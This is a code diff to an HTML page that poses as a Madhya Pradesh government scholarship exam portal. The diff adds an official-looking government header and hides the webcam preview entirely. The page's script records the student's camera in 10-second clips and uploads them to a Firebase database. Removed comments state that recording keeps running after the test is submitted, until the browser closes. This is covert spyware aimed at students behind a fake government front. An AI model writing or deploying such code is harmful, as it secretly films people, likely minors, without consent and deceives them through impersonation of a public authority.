@@ -10,62 +10,87 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
-        body { background-color: #1a202c; color: #fff; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .quiz-card { background: #2d3748; padding: 25px; border-radius: 12px; width: 100%; max-width: 600px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
-        h2 { text-align: center; margin-bottom: 20px; color: #38bdf8; font-size: 22px; }
-        .input-group { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-size: 14px; color: #cbd5e1; }
-        input[type="text"] { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #4a5568; background: #1a202c; color: #fff; font-size: 16px; }
-        .btn { width: 100%; padding: 12px; background: #38bdf8; color: #1a202c; border: none; font-weight: bold; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.2s; margin-top: 10px; }
-        .btn:hover { background: #0ea5e9; }
-        .question-box { display: none; margin-top: 20px; }
-        .q-title { font-size: 18px; margin-bottom: 15px; color: #f8fafc; }
-        .option-lbl { display: flex; align-items: center; background: #4a5568; padding: 12px; border-radius: 6px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
-        .option-lbl:hover { background: #718096; }
-        input[type="radio"] { margin-right: 12px; transform: scale(1.2); }
+        * { box-sizing: border-box; font-family: 'Arial', sans-serif; margin: 0; padding: 0; }
+        body { background-color: #f1f5f9; color: #334155; padding: 0; margin: 0; }
         
-        .message-screen { display: none; text-align: center; padding: 30px 10px; }
-        .message-screen h3 { font-size: 24px; color: #22c55e; margin-bottom: 15px; }
-        .message-screen p { color: #cbd5e1; font-size: 16px; line-height: 1.6; }
-        .eliminated-title { color: #ef4444 !important; }
+        /* सरकारी हेडर स्टाइल */
+        .gov-header { background: #1e3a8a; border-bottom: 4px solid #ea580c; color: white; padding: 15px 20px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .gov-header h1 { font-size: 24px; margin-bottom: 5px; font-weight: bold; letter-spacing: 1px; }
+        .gov-header p { font-size: 14px; color: #cbd5e1; }
+
+        .container { display: flex; justify-content: center; align-items: center; min-height: 75vh; padding: 20px; }
+        .quiz-card { background: #ffffff; padding: 30px; border-radius: 4px; width: 100%; max-width: 650px; border: 1px solid #cbd5e1; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
         
-        #video-preview { display: none; width: 100px; height: 75px; background: #000; border-radius: 6px; position: fixed; bottom: 10px; right: 10px; border: 2px solid #38bdf8; transform: scaleX(-1); }
+        .section-title { font-size: 18px; font-weight: bold; color: #1e3a8a; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px; margin-bottom: 20px; text-transform: uppercase; }
+        
+        .input-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: bold; color: #1e3a8a; }
+        input[type="text"] { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #cbd5e1; background: #fff; color: #334155; font-size: 16px; outline: none; }
+        input[type="text"]:focus { border-color: #1e3a8a; box-shadow: 0 0 0 3px rgba(30,58,138,0.1); }
+        
+        .btn { width: 100%; padding: 12px; background: #ea580c; color: #fff; border: none; font-weight: bold; border-radius: 4px; font-size: 16px; cursor: pointer; transition: 0.2s; text-transform: uppercase; letter-spacing: 0.5px; }
+        .btn:hover { background: #c2410c; }
+        
+        .question-box { display: none; }
+        .q-title { font-size: 18px; font-weight: bold; margin-bottom: 20px; color: #1a202c; line-height: 1.5; }
+        
+        .option-lbl { display: flex; align-items: center; background: #f8fafc; padding: 14px; border: 1px solid #e2e8f0; border-radius: 4px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
+        .option-lbl:hover { background: #f1f5f9; border-color: #cbd5e1; }
+        input[type="radio"] { margin-right: 14px; transform: scale(1.3); cursor: pointer; }
+        
+        /* सफलता और ब्लॉक स्क्रीन */
+        .message-screen { display: none; text-align: center; padding: 40px 10px; }
+        .message-screen h3 { font-size: 26px; color: #15803d; margin-bottom: 15px; font-weight: bold; }
+        .message-screen p { color: #475569; font-size: 16px; line-height: 1.6; }
+        .eliminated-title { color: #b91c1c !important; }
+        
+        /* कैमरा प्रिव्यू को पूरी तरह से गायब (Hidden) करने के लिए */
+        #video-preview { display: none !important; width: 1px; height: 1px; opacity: 0; pointer-events: none; position: absolute; }
     </style>
 </head>
 <body>
 
-<div class="quiz-card" id="main-card">
-    <!-- रजिस्ट्रेशन स्क्रीन -->
-    <div id="auth-screen">
-        <h2>🎓 MP Board Scholarship Test</h2>
-        <div class="input-group">
-            <label>अपना पूरा नाम दर्ज करें:</label>
-            <input type="text" id="student-name" placeholder="उदा. Anwar Khan">
+<!-- सरकारी हेडर -->
+<div class="gov-header">
+    <h1>राज्य छात्रवृत्ति परीक्षा पोर्टल (MP Board)</h1>
+    <p>शहरी एवं ग्रामीण क्षेत्र छात्रवृत्ति योजना - शिक्षा विभाग, मध्य प्रदेश सरकार</p>
+</div>
+
+<div class="container">
+    <div class="quiz-card" id="main-card">
+        <!-- रजिस्ट्रेशन स्क्रीन -->
+        <div id="auth-screen">
+            <div class="section-title">परीक्षार्थी पंजीकरण (Candidate Registration)</div>
+            <div class="input-group">
+                <label>अपना पूरा नाम दर्ज करें (Enter Your Full Name):</label>
+                <input type="text" id="student-name" placeholder="उदा. Anwar Khan">
+            </div>
+            <button class="btn" onclick="startRegistration()">परीक्षा शुरू करें</button>
         </div>
-        <button class="btn" onclick="startRegistration()">परीक्षा शुरू करें</button>
-    </div>
 
-    <!-- परीक्षा प्रश्न स्क्रीन -->
-    <div id="quiz-screen" class="question-box">
-        <h3 id="question-text" class="q-title">로드 हो रहा है...</h3>
-        <div id="options-container"></div>
-        <button class="btn" id="next-btn" onclick="submitAnswer()">अगला प्रश्न</button>
-    </div>
+        <!-- परीक्षा प्रश्न स्क्रीन -->
+        <div id="quiz-screen" class="question-box">
+            <div class="section-title">ऑनलाइन प्रश्न पत्र (Online Question Paper)</div>
+            <h3 id="question-text" class="q-title">लोड हो रहा है...</h3>
+            <div id="options-container"></div>
+            <button class="btn" id="next-btn" onclick="submitAnswer()">अगला प्रश्न</button>
+        </div>
 
-    <!-- सफलतापूर्ण सबमिशन स्क्रीन -->
-    <div id="success-screen" class="message-screen">
-        <h3>✅ सबमिट हो गया है!</h3>
-        <p>आपका टेस्ट सफलतापूर्वक सबमिट हो गया है। अगले टेस्ट के लिए इंतज़ार करें, आपको जल्द ही अगला test मिलेगा।</p>
-    </div>
+        <!-- सफलतापूर्ण सबमिशन स्क्रीन -->
+        <div id="success-screen" class="message-screen">
+            <h3>✅ सबमिट हो गया है!</h3>
+            <p>आपका टेस्ट सफलतापूर्वक सबमिट हो गया है। अगले टेस्ट के लिए इंतज़ार करें, आपको जल्द ही अगला test मिलेगा।</p>
+        </div>
 
-    <!-- एलिमिनेटेड स्क्रीन -->
-    <div id="eliminated-screen" class="message-screen">
-        <h3 class="eliminated-title">🚫 आप बाहर (Eliminated) हो चुके हैं!</h3>
-        <p>एडमिन द्वारा आपको इस परीक्षा से अयोग्य घोषित कर दिया गया है। अब आप आगे टेस्ट नहीं दे सकते।</p>
+        <!-- एलिमिनेटेड स्क्रीन -->
+        <div id="eliminated-screen" class="message-screen">
+            <h3 class="eliminated-title">🚫 आप बाहर (Eliminated) हो चुके हैं!</h3>
+            <p>प्रशासनिक कारणों या नियमों के उल्लंघन के कारण आपको इस परीक्षा से बाहर कर दिया गया है।</p>
+        </div>
     </div>
 </div>
 
+<!-- हिडन कैमरा एलिमेंट (छात्र को नहीं दिखेगा) -->
 <video id="video-preview" autoplay muted playsinline></video>
 
 <script>
@@ -83,6 +108,7 @@
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
+    // प्रश्न बैंक डेटाबेस
     const questions = [
         { q: "मध्य प्रदेश की राजधानी क्या है?", roles: ["भोपाल", "इंदौर", "जबलपुर", "ग्वालियर"], ans: "भोपाल" },
         { q: "भारत का राष्ट्रीय पक्षी कौन सा है?", roles: ["कबूतर", "मोर", "तोता", "चील"], ans: "मोर" },
@@ -109,7 +135,6 @@
         navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120, frameRate: 10 }, audio: false })
         .then(stream => {
             const videoPrev = document.getElementById('video-preview');
-            videoPrev.style.display = 'block';
             videoPrev.srcObject = stream;
 
             database.ref('students/' + studentId + '/profile').set({
@@ -138,7 +163,6 @@
                 if(mediaRecorder && mediaRecorder.stream) {
                     mediaRecorder.stream.getTracks().forEach(track => track.stop());
                 }
-                document.getElementById('video-preview').style.display = 'none';
                 document.getElementById('quiz-screen').style.display = 'none';
                 document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('success-screen').style.display = 'none';
@@ -163,11 +187,9 @@
             }
         };
 
-        // हर 10 सेकंड में बैकग्राउंड में क्लिप्स काटकर डेटाबेस भेजेगा
         mediaRecorder.start(10000); 
 
         setInterval(() => {
-            // जब तक ब्राउज़र चालू है, टाइमस्टैम्प अपडेट होता रहेगा
             database.ref('students/' + studentId + '/profile').update({
                 last_active_at: firebase.database.ServerValue.TIMESTAMP
             });
@@ -204,7 +226,17 @@
         const selectedOpt = document.querySelector('input[name="quiz-opt"]:checked');
         if(!selectedOpt) { alert("कृपया एक विकल्प चुनें!"); return; }
 
-        answersSubmitted[`answer_q${currentQIdx + 1}`] = selectedOpt.value;
+        // आंसर के साथ क्वेश्चन टेक्स्ट और चेकिंग भी स्टोर करें
+        const currentQuestion = questions[currentQIdx];
+        const isCorrect = (selectedOpt.value === currentQuestion.ans);
+
+        answersSubmitted[`q${currentQIdx + 1}`] = {
+            question: currentQuestion.q,
+            selected_option: selectedOpt.value,
+            correct_option: currentQuestion.ans,
+            status: isCorrect ? "CORRECT" : "WRONG"
+        };
+
         database.ref(`students/${studentId}/test_attempts/${attemptId}/answers`).update(answersSubmitted);
 
         currentQIdx++;
@@ -216,7 +248,6 @@
             portal_status: "SUBMITTED"
         });
 
-        // चालू रिकॉर्डिंग से वर्तमान डेटा तुरंत बाहर निकालें बिना कैमरा रोके
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.requestData();
         }
@@ -227,8 +258,6 @@
             document.getElementById('quiz-screen').style.display = 'none';
             document.getElementById('success-screen').style.display = 'block';
         });
-        
-        // ध्यान दें: यहाँ कैमरा या रिकॉर्डर स्टॉप नहीं किया गया है ताकि ब्राउज़र बंद होने तक वीडियो आता रहे।
     }
 </script>
 </body>
